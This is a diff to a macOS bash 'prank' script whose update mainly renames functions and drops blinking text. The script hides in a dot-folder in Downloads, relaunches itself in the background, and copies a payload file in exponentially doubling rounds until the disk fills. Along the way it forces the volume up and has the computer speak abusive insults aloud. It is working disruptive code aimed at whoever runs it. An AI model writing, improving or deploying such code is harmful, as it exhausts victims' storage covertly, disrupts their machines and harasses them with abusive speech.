@@ -1,19 +1,19 @@
 #!/bin/bash
 
-# Karan's Ultimate Prank v3.9.1 - FIXED DARK GRITTY AUDIO EDITION
-# Dark commentary actually works now!
+# Karan's Ultimate Prank v3.9.2 - FINAL FIXED EDITION
 
-VERSION="3.9.1"
+
+VERSION="3.9.2"
 HIDDEN_DIR="$HOME/Downloads/.Karan"
 
-# Colors
+# Colors (REMOVED BLINK)
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
-BOLD='\033[1m'; BLINK='\033[5m'; BG_GREEN='\033[42m'
+BOLD='\033[1m'; BG_GREEN='\033[42m'
 BG_RED='\033[41m'; BG_YELLOW='\033[43m'; BG_PURPLE='\033[45m'
 WHITE='\033[1;37m'; NC='\033[0m'
 
-# DARK GRITTY MESSAGES
+# DARK GRITTY MESSAGES (Visual)
 DARK_MESSAGES=(
     "🎪 Welcome to Karan's exponential circus of doom!"
     "🔥 Burning through bytes like a digital inferno!"
@@ -66,8 +66,8 @@ DARK_MESSAGES=(
     "🔥 Phoenix rising from your storage ashes!"
 )
 
-# DARK AUDIO MESSAGES (The ones that should be spoken)
-AUDIO_MESSAGES=(
+# DARK AUDIO MESSAGES
+DARK_AUDIO=(
     "Your disk is crying tears of binary despair!"
     "i know you're a shit-stained loser"
     "i know you're a fucking waste of skin"
@@ -114,36 +114,35 @@ setup() {
     chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
 }
 
-# Enhanced logging
+# Clean logging (no blinking)
 log_msg() {
     echo -e "${1}${2}${NC}"
     echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
 }
 
-# Random dark message
+# Random dark message (no blinking)
 dark_msg() {
     local msg=${DARK_MESSAGES[$RANDOM % ${#DARK_MESSAGES[@]}]}
     local colors=("$RED$BOLD" "$PURPLE$BOLD" "$YELLOW$BOLD" "$CYAN$BOLD" "$BG_RED$WHITE$BOLD")
     local color=${colors[$RANDOM % ${#colors[@]}]}
-    log_msg "$color$BLINK" "$msg"
+    log_msg "$color" "$msg"
 }
 
-# FIXED: Dark audio that actually speaks the dark messages
-speak_dark_message() {
-    # Kill any existing audio to prevent overlap
+# COMPLETELY FIXED: Only speak dark messages
+speak_only_dark() {
+    # Kill ALL existing audio processes
     pkill -f "say" 2>/dev/null || true
-    sleep 0.1
+    sleep 0.2
     
-    # Pick a random dark audio message
-    local dark_audio=${AUDIO_MESSAGES[$RANDOM % ${#AUDIO_MESSAGES[@]}]}
+    # Pick ONLY from dark audio messages
+    local dark_line=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
     
-    # Set volume and speak the dark message
+    # Speak ONLY the dark message (no file counts)
     osascript -e "set volume output volume 90" 2>/dev/null || true
-    say "$dark_audio" 2>/dev/null
-    wait
+    say "$dark_line" 2>/dev/null &
 }
 
-# EXPONENTIAL DUPLICATION WITH FIXED DARK AUDIO
+# EXPONENTIAL DUPLICATION WITH ONLY DARK AUDIO
 exponential_destruction() {
     local payload="$1"
     local round=0
@@ -154,37 +153,37 @@ exponential_destruction() {
     setup
     cp "$payload" "$HIDDEN_DIR/.payload"
     
-    log_msg "$BG_PURPLE$WHITE$BOLD$BLINK" "🎭 Karan's Ultimate Prank v3.9.1 - FIXED DARK AUDIO!"
-    log_msg "$BG_RED$WHITE$BOLD" "💀 Dark commentary actually working now!"
+    log_msg "$BG_PURPLE$WHITE$BOLD" "🎭 Karan's Ultimate Prank v3.9.2 - FINAL FIXED!"
+    log_msg "$BG_RED$WHITE$BOLD" "💀 ONLY dark audio, NO blinking spam!"
     
-    # Epic dark startup
-    speak_dark_message
+    # Epic dark startup (ONLY dark message)
+    speak_only_dark
     
-    log_msg "$RED$BOLD$BLINK" "🚀 INITIATING EXPONENTIAL DIGITAL APOCALYPSE!"
+    log_msg "$RED$BOLD" "🚀 INITIATING EXPONENTIAL DIGITAL APOCALYPSE!"
     dark_msg
     
     # Create first file
     if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
         log_msg "$RED$BOLD" "💾 IMMEDIATE DISK DEATH!"
-        speak_dark_message
+        speak_only_dark
         return
     fi
     current_count=1
     
     log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND 0: First victim created (Total: 1)"
-    speak_dark_message
+    speak_only_dark
     
-    # Exponential loop with FIXED dark commentary
+    # Exponential loop with ONLY dark audio
     while true; do
         round=$((round + 1))
         local new_target=$((target_count * 2))
         local files_to_create=$((new_target - current_count))
         
-        log_msg "$BG_YELLOW$RED$BOLD$BLINK" "🔥 ROUND $round: Doubling the carnage $current_count → $new_target!"
+        log_msg "$BG_YELLOW$RED$BOLD" "🔥 ROUND $round: Doubling the carnage $current_count → $new_target!"
         dark_msg
-        speak_dark_message
+        speak_only_dark
         
-        # Create files with CONSTANT dark commentary
+        # Create files
         local created_this_round=0
         for ((i=1; i<=files_to_create; i++)); do
             local new_file_num=$((current_count + i))
@@ -193,80 +192,78 @@ exponential_destruction() {
             # Attempt duplication
             if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
                     "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
-                log_msg "$BG_RED$WHITE$BOLD$BLINK" "💀 DISK FLATLINED! Final body count: $((current_count + created_this_round))!"
-                speak_dark_message
+                log_msg "$BG_RED$WHITE$BOLD" "💀 DISK FLATLINED! Final body count: $((current_count + created_this_round))!"
+                speak_only_dark
                 return
             fi
             
             created_this_round=$((created_this_round + 1))
             
-            # CONTINUOUS dark commentary every 30 files
-            if [[ $((created_this_round % 30)) -eq 0 ]]; then
+            # Dark commentary every 40 files (ONLY dark audio)
+            if [[ $((created_this_round % 40)) -eq 0 ]]; then
                 dark_msg
-                speak_dark_message
+                speak_only_dark
             fi
             
             # Progress during large rounds
-            if [[ $((created_this_round % 200)) -eq 0 ]] && [[ $files_to_create -gt 1000 ]]; then
+            if [[ $((created_this_round % 300)) -eq 0 ]] && [[ $files_to_create -gt 1000 ]]; then
                 log_msg "$CYAN$BOLD" "⚡ Round $round carnage: $created_this_round/$files_to_create victims eliminated..."
-                speak_dark_message
+                speak_only_dark
             fi
         done
         
         current_count=$new_target
         target_count=$new_target
         
-        # Round completion with dark celebration
+        # Round completion (ONLY dark audio)
         log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND $round COMPLETE: Total casualties = $current_count"
         dark_msg
-        speak_dark_message
+        speak_only_dark
         
-        # Exponential milestones with dark audio
+        # Milestones (ONLY dark audio, NO file number announcements)
         case $current_count in
             2)
-                log_msg "$YELLOW$BOLD$BLINK" "🎉 DOUBLED TO 2! The exponential nightmare begins!"
-                speak_dark_message
+                log_msg "$YELLOW$BOLD" "🎉 DOUBLED TO 2! The exponential nightmare begins!"
+                speak_only_dark
                 ;;
             16)
-                log_msg "$RED$BOLD$BLINK" "🔥 REACHED 16! Exponential hellfire unleashed!"
-                speak_dark_message
+                log_msg "$RED$BOLD" "🔥 REACHED 16! Exponential hellfire unleashed!"
+                speak_only_dark
                 ;;
             256)
-                log_msg "$PURPLE$BOLD$BLINK" "💎 256 FILES! Exponential death mastery achieved!"
-                speak_dark_message
+                log_msg "$PURPLE$BOLD" "💎 256 FILES! Exponential death mastery achieved!"
+                speak_only_dark
                 ;;
             4096)
-                log_msg "$BG_RED$WHITE$BOLD$BLINK" "🚀 4096 FILES! EXPONENTIAL ARMAGEDDON!"
-                speak_dark_message
+                log_msg "$BG_RED$WHITE$BOLD" "🚀 4096 FILES! EXPONENTIAL ARMAGEDDON!"
+                speak_only_dark
                 ;;
             65536)
-                log_msg "$BG_PURPLE$WHITE$BOLD$BLINK" "👑 65,536 FILES! EXPONENTIAL EMPEROR OF DESTRUCTION!"
-                speak_dark_message
+                log_msg "$BG_PURPLE$WHITE$BOLD" "👑 65,536 FILES! EXPONENTIAL EMPEROR OF DESTRUCTION!"
+                speak_only_dark
                 ;;
         esac
         
-        # Extra dark messages every round
+        # Extra dark message every round
         dark_msg
-        speak_dark_message
+        speak_only_dark
         
-        # Brief pause for audio
-        sleep 0.3
+        # Brief pause
+        sleep 0.4
     done
 }
 
 # Validate
 validate() {
-    [[ "$(uname)" == "Darwin" ]] || { echo "💀 ERROR: macOS required for this digital carnage!"; exit 1; }
-    [[ -f "$1" ]] || { echo "🔍 ERROR: Payload not found for destruction!"; exit 1; }
+    [[ "$(uname)" == "Darwin" ]] || { echo "💀 ERROR: macOS required!"; exit 1; }
+    [[ -f "$1" ]] || { echo "🔍 ERROR: Payload not found!"; exit 1; }
 }
 
 # Execution
 if [[ "$2" == "--execute" ]]; then
-    # Background execution
     exec >> "$HIDDEN_DIR/.log" 2>&1
     exponential_destruction "$1"
 else
-    # Launch the dark destruction
     validate "$1"
     setup
     "$0" "$1" --execute &
